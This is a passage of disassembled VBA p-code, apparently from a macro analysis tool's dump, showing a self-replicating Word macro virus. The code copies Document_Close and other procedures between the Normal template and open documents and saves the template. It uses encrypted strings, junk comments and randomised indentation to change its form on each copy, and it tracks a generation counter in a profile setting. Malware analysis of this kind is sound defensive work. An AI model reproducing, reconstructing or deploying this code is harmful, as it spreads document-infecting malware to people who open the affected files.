' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #119:
' 	Ld Var_Start 
' 	Ld Var_Count2 
' 	Add 
' 	LitDI2 0x0001 
' 	Add 
' 	St Var_Start 
' Line #120:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcBodyLine 0x0002 
' 	St Var_Start2 
' Line #121:
' 	LitStr 0x000E "Document_Close"
' 	Ld vbext_pk_Proc 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd ProcCountLines 0x0002 
' 	St Var_Count2 
' Line #122:
' 	Ld Var_Start 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Ld Var_Start2 
' 	Ld Var_Count2 
' 	Ld objet2 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Ld objet 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #123:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #124:
' 	EndIfBlock 
' Line #125:
' 	Label V3VF8bKRl5nA684d 
' Line #126:
' 	Dim 
' 	VarDefn K9Bm6t353BaD (As Byte)
' Line #127:
' 	Dim 
' 	VarDefn T7SAs7h1CF0wvWqQ (As String)
' Line #128:
' 	Dim 
' 	VarDefn EJI3827ImdS1 (As String)
' Line #129:
' 	Dim 
' 	VarDefn J4DAKmx68y3B9e (As String)
' Line #130:
' 	Dim 
' 	VarDefn By4Vq4Qglc7 (As Long)
' Line #131:
' 	Dim 
' 	VarDefn Xu17GqW4w6tAsta33061UC1nc1n (As Object)
' Line #132:
' 	QuoteRem 0x0000 0x002B "2063.979   3945.947    20.39364    3860.134"
' Line #133:
' 	GoTo We8lRlfOa29ML4MF5i7 
' Line #134:
' 	Label HM2fh8Ofy1dE8liCfc 
' Line #135:
' 	QuoteRem 0x0000 0x005F "291.4659   3672.648    887.355 3737.81 303.8591    4069.279    271.4106    3282.785    6747.507"
' Line #136:
' 	Ld By4Vq4Qglc7 
' 	Ld J4DAKmx68y3B9e 
' 	Ld Xu17GqW4w6tAsta33061UC1nc1n 
' 	ArgsMemCall InsertLines 0x0002 
' Line #137:
' 	Return 
' Line #138:
' 	Label We8lRlfOa29ML4MF5i7 
' Line #139:
' 	GoSub Vu8rWFA9Ej2 
' Line #140:
' 	QuoteRem 0x0000 0x0056 "440.9698   1618.125    7771.797    3036.13 123.4961    3285.969    6569.576    4905.77"
' Line #141:
' 	OnError KQhb5kf52d9Q90ve2 
' Line #142:
' 	Dim (Const) 
' 	LitStr 0x0063 "Ç•í†³œ¢èêÈ¸Œ¡ÌõºÏÊÑÄ‘¹¾—°·�áŽ¯‡±€‹ç¨ãˆ¥Áðò²÷«™�Óà Ðµ¶ëÂ„¼�Ÿ”¿›­»½¦“š�ÍÅ¬ù’ìâª£ƒÃ�˜§‰´‚Àú©ÿž¤ï®óËŠøå"
' 	VarDefn C5KU88q3NKNNdJ3fV
' 	QuoteRem 0x0080 0x000A ""1/31/121""
' Line #143:
' 	QuoteRem 0x0000 0x0012 "191.9066   5345.25"
' Line #144:
' 	Dim 
' 	VarDefn C9kpgxW5Y0E8fNkNHoH (As String)
' Line #145:
' 	Dim 
' 	VarDefn B8LpM131ei639bf284e5 (As String)
' Line #146:
' 	Dim 
' 	VarDefn P9Ws98b1734 (As String)
' Line #147:
' 	Dim 
' 	VarDefn I31a6731A3TPTQpu (As Long)
' Line #148:
' 	Dim 
' 	VarDefn Mpaq715g25NGb7Dk55 (As Long)
' Line #149:
' 	Dim 
' 	VarDefn Kmc4Ms3l1m4074Y (As String)
' Line #150:
' 	Dim 
' 	VarDefn NlY8Q5Hd7gwSw2en4XuI (As String)
' Line #151:
' 	Dim 
' 	VarDefn CpJ0d1Bfi2q (As Long)
' Line #152:
' 	Dim 
' 	VarDefn ChJaS1rh8wy545qTD3Oh (As Long)
' Line #153:
' 	Dim 
' 	VarDefn CH4FiSmTVaO80BVm (As Long)
' Line #154:
' 	LitStr 0x003C "�Þ¨ßìÐí««„çÁà�½ó���—þßÊàÑÅø½ÃÆäÃïøˆÎ—Ôò¨ž–Ý€ØÅÌ¦’ÒµÛÂ½§öÏùðú"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St Kmc4Ms3l1m4074Y 
' Line #155:
' 	LitStr 0x0012 "”å‚åØÊÇš™¡×âï¹˜Øª¸"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St NlY8Q5Hd7gwSw2en4XuI 
' Line #156:
' 	LitStr 0x0000 ""
' 	Ld Kmc4Ms3l1m4074Y 
' 	Ld NlY8Q5Hd7gwSw2en4XuI 
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #157:
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #158:
' 	LitDI2 0x0001 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	LitDI2 0x002F 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	St I31a6731A3TPTQpu 
' 	BoS 0x0000 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	LitDI2 0x0001 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St CpJ0d1Bfi2q 
' Line #159:
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mpaq715g25NGb7Dk55 
' 	BoS 0x0000 
' 	Ld Mpaq715g25NGb7Dk55 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	LitDI2 0x002F 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	St I31a6731A3TPTQpu 
' 	BoS 0x0000 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld Mpaq715g25NGb7Dk55 
' 	Ld I31a6731A3TPTQpu 
' 	Ld Mpaq715g25NGb7Dk55 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St ChJaS1rh8wy545qTD3Oh 
' Line #160:
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	St CH4FiSmTVaO80BVm 
' Line #161:
' 	LitStr 0x000D "áØ„õÇùÐÈ¹¸×ïÊ"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0026 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0040 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	LitDI2 0x0020 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld CpJ0d1Bfi2q 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld ChJaS1rh8wy545qTD3Oh 
' 	Concat 
' 	LitDI2 0x002E 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld CH4FiSmTVaO80BVm 
' 	Concat 
' 	LitDI2 0x039F 
' 	ParamNamed ID 
' 	Ld Application 
' 	MemLd CommandBars 
' 	ArgsMemLd FindControl 0x0001 
' 	MemSt Caption 
' Line #162:
' 	ElseBlock 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St CpJ0d1Bfi2q 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St ChJaS1rh8wy545qTD3Oh 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St CH4FiSmTVaO80BVm 
' Line #163:
' 	EndIfBlock 
' Line #164:
' 	Dim 
' 	VarDefn TfShIG3a56FQV54o (As Object)
' Line #165:
' 	Dim 
' 	VarDefn K1ckH7chEf84syd6g (As Object)
' Line #166:
' 	Dim 
' 	VarDefn D83SEqQ43mUTK9u85W4E (As Object)
' Line #167:
' 	Dim 
' 	VarDefn LRbDSg04suq763Hs (As Object)
' Line #168:
' 	QuoteRem 0x0000 0x0012 "2459.426   2101.06"
' Line #169:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set TfShIG3a56FQV54o 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld TfShIG3a56FQV54o 
' 	Set K1ckH7chEf84syd6g 
' Line #170:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld TfShIG3a56FQV54o 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #171:
' 	LitDI2 0x0001 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld TfShIG3a56FQV54o 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld C5KU88q3NKNNdJ3fV 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set K1ckH7chEf84syd6g 
' 	BoS 0x0000 
' 	ExitFor 
' 	EndIf 
' Line #172:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	Ld TfShIG3a56FQV54o 
' 	Ld K1ckH7chEf84syd6g 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set TfShIG3a56FQV54o 
' 	EndIf 
' Line #173:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld K1ckH7chEf84syd6g 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set LRbDSg04suq763Hs 
' Line #174:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld TfShIG3a56FQV54o 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set D83SEqQ43mUTK9u85W4E 
' Line #175:
' 	Dim 
' 	VarDefn CP4fStWRJJgnNu9ua (As String)
' Line #176:
' 	LitStr 0x0007 "‚û‰¦àéÀ"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' 	BoS 0x0000 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	St CP4fStWRJJgnNu9ua 
' Line #177:
' 	LitStr 0x000F "ˆÅ¹ÏüÒ‚­²˜ôÅâ…¡"
' 	St T7SAs7h1CF0wvWqQ 
' 	BoS 0x0000 
' 	GoSub K4HIhrETANiN6XySX 
' Line #178:
' 	QuoteRem 0x0000 0x006A "1769.373   2931.761    5287.98 1237.11 1821.291    4542.444    1172.519    960.1935    1973.841    127.006"
' Line #179:
' 	StartWithExpr 
' 	Ld LRbDSg04suq763Hs 
' 	With 
' Line #180:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #181:
' 	QuoteRem 0x0000 0x0067 "5125.202   629.8511    242.9626    2805.329    4573.749    1717.357    3177.429    1812.427    4336.017"
' Line #182:
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	ArgsLd Trim$ 0x0001 
' 	ArgsLd UCase$ 0x0001 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	ArgsLd Trim$ 0x0001 
' 	FnLen 
' 	ArgsLd LBound$ 0x0002 
' 	Ld T7SAs7h1CF0wvWqQ 
' 	Eq 
' 	IfBlock 
' Line #183:
' 	QuoteRem 0x0000 0x004F "6671.35    941.8299    155.9735    232.7459    742.9123    3684.066    9010.989"
' Line #184:
' 	Ld I31a6731A3TPTQpu 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	BoS 0x0000 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Sub 
' 	St I31a6731A3TPTQpu 
' Line #185:
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	ArgsLd Trim$ 0x0001 
' 	LitDI2 0x0005 
' 	ArgsLd LBound$ 0x0002 
' 	LitDI2 0x0043 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Eq 
' 	ElseIfBlock 
' Line #186:
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	ArgsLd Trim$ 0x0001 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	ArgsLd Trim$ 0x0001 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	St B8LpM131ei639bf284e5 
' Line #187:
' 	QuoteRem 0x0000 0x004F "281.966    3223.523    1867.752    1055.744    7616.671    4429.099    2964.733"
' Line #188:
' 	Ld B8LpM131ei639bf284e5 
' 	Ld B8LpM131ei639bf284e5 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr 
' 	ArgsLd LBound$ 0x0002 
' 	St B8LpM131ei639bf284e5 
' Line #189:
' 	LitDI2 0x0000 
' 	St By4Vq4Qglc7 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld Mpaq715g25NGb7Dk55 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld B8LpM131ei639bf284e5 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' 	BoS 0x0000 
' 	Ld By4Vq4Qglc7 
' 	Ld B8LpM131ei639bf284e5 
' 	Ld Mpaq715g25NGb7Dk55 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Add 
' 	St By4Vq4Qglc7 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld Mpaq715g25NGb7Dk55 
' 	EndForVariable 
' 	NextVar 
' Line #190:
' 	Ld By4Vq4Qglc7 
' 	LitDI2 0x46D6 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo KQhb5kf52d9Q90ve2 
' 	Else 
' 	BoSImplicit 
' 	ExitFor 
' 	EndIf 
' Line #191:
' 	QuoteRem 0x0000 0x0013 "1765.218   1435.795"
' Line #192:
' 	EndIfBlock 
' Line #193:
' 	QuoteRem 0x0000 0x004F "2003.325   2007.108    2484.551    2146.719    1011.456    423.5487    3184.814"
' Line #194:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	NextVar 
' Line #195:
' 	EndWith 
' Line #196:
' 	Dim 
' 	VarDefn Q8vOoxI4KL52qbLbyo7P (As String)
' Line #197:
' 	Ld C5KU88q3NKNNdJ3fV 
' 	St Q8vOoxI4KL52qbLbyo7P 
' 	BoS 0x0000 
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #198:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Q8vOoxI4KL52qbLbyo7P 
' 	FnLen 
' 	For 
' Line #199:
' 	Ld Rnd 
' 	Ld Q8vOoxI4KL52qbLbyo7P 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mpaq715g25NGb7Dk55 
' 	BoS 0x0000 
' 	Ld Q8vOoxI4KL52qbLbyo7P 
' 	Ld Mpaq715g25NGb7Dk55 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #200:
' 	Ld Q8vOoxI4KL52qbLbyo7P 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	Ld Q8vOoxI4KL52qbLbyo7P 
' 	Ld Mpaq715g25NGb7Dk55 
' 	LitDI2 0x0001 
' 	Mid 
' 	BoS 0x0000 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld Q8vOoxI4KL52qbLbyo7P 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Mid 
' Line #201:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	NextVar 
' Line #202:
' 	Dim 
' 	VarDefn NtYVb56bhPo (As Long)
' Line #203:
' 	Dim 
' 	VarDefn XETANiN6XySXhlCv8 (As Long)
' Line #204:
' 	StartWithExpr 
' 	Ld D83SEqQ43mUTK9u85W4E 
' 	With 
' Line #205:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #206:
' 	LitDI2 0x0001 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitStr 0x0010 "V3VF8bKRl5nA684d"
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #207:
' 	Ld I31a6731A3TPTQpu 
' 	St NtYVb56bhPo 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitStr 0x0011 "KQhb5kf52d9Q90ve2"
' 	LitDI2 0x003A 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	FnInStr3 
' 	LitDI2 0x0000 
' 	Gt 
' 	ElseIfBlock 
' 	Ld I31a6731A3TPTQpu 
' 	St XETANiN6XySXhlCv8 
' 	BoS 0x0000 
' 	ExitFor 
' Line #208:
' 	EndIfBlock 
' Line #209:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	NextVar 
' Line #210:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	Ld NtYVb56bhPo 
' 	Ld XETANiN6XySXhlCv8 
' 	For 
' Line #211:
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	ArgsLd Trim$ 0x0001 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #212:
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	LitDI2 0x0001 
' 	ArgsLd LBound$ 0x0002 
' 	LitDI2 0x0027 
' 	ArgsLd Chr$ 0x0001 
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld EJI3827ImdS1 
' 	Ld Rnd 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	ArgsLd String$$ 0x0002 
' 	Concat 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St EJI3827ImdS1 
' 	EndIf 
' Line #213:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' 	BoS 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld EJI3827ImdS1 
' 	Ld vbCr 
' 	Concat 
' 	St EJI3827ImdS1 
' 	EndIf 
' Line #214:
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0008 
' 	Gt 
' 	IfBlock 
' Line #215:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #216:
' 	StartForVariable 
' 	Ld Mpaq715g25NGb7Dk55 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld Rnd 
' 	LitDI2 0x0009 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	For 
' Line #217:
' 	QuoteRem 0x0000 0x0073 "2449.068   4605.359    913.7684    392.0889    664.3395    1914.047    6186.325    9.931795    673.4662    1903.295"
' Line #218:
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Ld Rnd 
' 	Ld Rnd 
' 	LitDI2 0x2710 
' 	Mul 
' 	Paren 
' 	Mul 
' 	Concat 
' 	Ld vbTab 
' 	Concat 
' 	St C9kpgxW5Y0E8fNkNHoH 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld Mpaq715g25NGb7Dk55 
' 	EndForVariable 
' 	NextVar 
' Line #219:
' 	LitDI2 0x0027 
' 	ArgsLd Chr$ 0x0001 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Concat 
' 	St C9kpgxW5Y0E8fNkNHoH 
' 	BoS 0x0000 
' 	Ld EJI3827ImdS1 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Concat 
' 	Ld vbCr 
' 	Concat 
' 	St EJI3827ImdS1 
' Line #220:
' 	EndIfBlock 
' Line #221:
' 	StartForVariable 
' 	Ld I31a6731A3TPTQpu 
' 	EndForVariable 
' 	NextVar 
' Line #222:
' 	QuoteRem 0x0000 0x0063 "1447.518   2409.03 1493.887    830.1978    3080.558    1173.473    2007.344    4152.993    986.7151"
' Line #223:
' 	EndWith 
' Line #224:
' 	Dim 
' 	VarDefn M32jk4AlYbb (As String)
' Line #225:
' 	Dim 
' 	VarDefn I7j1A2ejItuv7TLM7r (As String)
' Line #226:
' 	LitDI2 0x0001 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x0043 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x006F 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x006E 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0073 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitDI2 0x0074 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	FnInStr3 
' 	LitDI2 0x0005 
' 	Add 
' 	St NtYVb56bhPo 
' Line #227:
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld NtYVb56bhPo 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x003D 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	St XETANiN6XySXhlCv8 
' 	EndIf 
' Line #228:
' 	Ld EJI3827ImdS1 
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld XETANiN6XySXhlCv8 
' 	Ld NtYVb56bhPo 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim$ 0x0001 
' 	St M32jk4AlYbb 
' 	BoS 0x0000 
' 	GoSub Yc79VMMCiI8p8 
' Line #229:
' 	Ld NtYVb56bhPo 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x003D 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	LitDI2 0x0003 
' 	Add 
' 	St NtYVb56bhPo 
' Line #230:
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld EJI3827ImdS1 
' 	Ld NtYVb56bhPo 
' 	Ld C5KU88q3NKNNdJ3fV 
' 	FnLen 
' 	ArgsLd Mid$$ 0x0003 
' 	Ld C5KU88q3NKNNdJ3fV 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld Q8vOoxI4KL52qbLbyo7P 
' 	Ld EJI3827ImdS1 
' 	Ld NtYVb56bhPo 
' 	Ld C5KU88q3NKNNdJ3fV 
' 	FnLen 
' 	Mid 
' 	Else 
' 	BoSImplicit 
' 	BoS 0x0000 
' 	GoTo KQhb5kf52d9Q90ve2 
' 	EndIf 
' Line #231:
' 	QuoteRem 0x0000 0x001F "102.8687   1242.403    3755.538"
' Line #232:
' 	Ld NtYVb56bhPo 
' 	Ld C5KU88q3NKNNdJ3fV 
' 	FnLen 
' 	Add 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x0027 
' 	ArgsLd Chr$ 0x0001 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	FnInStr3 
' 	LitDI2 0x0001 
' 	Add 
' 	St NtYVb56bhPo 
' Line #233:
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld NtYVb56bhPo 
' 	Ld EJI3827ImdS1 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	FnInStr3 
' 	LitDI2 0x0001 
' 	Sub 
' 	St XETANiN6XySXhlCv8 
' 	EndIf 
' Line #234:
' 	Ld EJI3827ImdS1 
' 	Ld NtYVb56bhPo 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld XETANiN6XySXhlCv8 
' 	Ld NtYVb56bhPo 
' 	Sub 
' 	Paren 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Trim$ 0x0001 
' 	St M32jk4AlYbb 
' Line #235:
' 	LitDI2 0x0001 
' 	Ld M32jk4AlYbb 
' 	LitDI2 0x002F 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	St I31a6731A3TPTQpu 
' 	BoS 0x0000 
' 	Ld M32jk4AlYbb 
' 	LitDI2 0x0001 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St C9kpgxW5Y0E8fNkNHoH 
' Line #236:
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Add 
' 	St Mpaq715g25NGb7Dk55 
' 	BoS 0x0000 
' 	Ld Mpaq715g25NGb7Dk55 
' 	Ld M32jk4AlYbb 
' 	LitDI2 0x002F 
' 	ArgsLd Chr$ 0x0001 
' 	FnInStr3 
' 	St I31a6731A3TPTQpu 
' Line #237:
' 	Ld M32jk4AlYbb 
' 	Ld Mpaq715g25NGb7Dk55 
' 	Ld I31a6731A3TPTQpu 
' 	Ld Mpaq715g25NGb7Dk55 
' 	Sub 
' 	ArgsLd Mid$$ 0x0003 
' 	St B8LpM131ei639bf284e5 
' 	BoS 0x006A 
' 	Ld M32jk4AlYbb 
' 	Ld I31a6731A3TPTQpu 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Mid$$ 0x0002 
' 	St P9Ws98b1734 
' Line #238:
' 	Ld K1ckH7chEf84syd6g 
' 	Ld NormalTemplate 
' 	Eq 
' 	Ld CpJ0d1Bfi2q 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	Ld C9kpgxW5Y0E8fNkNHoH 
' 	St CpJ0d1Bfi2q 
' 	EndIf 
' Line #239:
' 	Ld ChJaS1rh8wy545qTD3Oh 
' 	Ld B8LpM131ei639bf284e5 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld B8LpM131ei639bf284e5 
' 	St ChJaS1rh8wy545qTD3Oh 
' 	EndIf 
' Line #240:
' 	Ld CH4FiSmTVaO80BVm 
' 	Ld P9Ws98b1734 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld P9Ws98b1734 
' 	St CH4FiSmTVaO80BVm 
' 	EndIf 
' Line #241:
' 	Ld K1ckH7chEf84syd6g 
' 	Ld NormalTemplate 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ChJaS1rh8wy545qTD3Oh 
' 	LitDI2 0x0001 
' 	Add 
' 	St ChJaS1rh8wy545qTD3Oh 
' 	Else 
' 	BoSImplicit 
' 	Ld CH4FiSmTVaO80BVm 
' 	LitDI2 0x0001 
' 	Add 
' 	St CH4FiSmTVaO80BVm 
' 	EndIf 
' Line #242:
' 	Ld CpJ0d1Bfi2q 
' 	LitDI2 0x002F 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
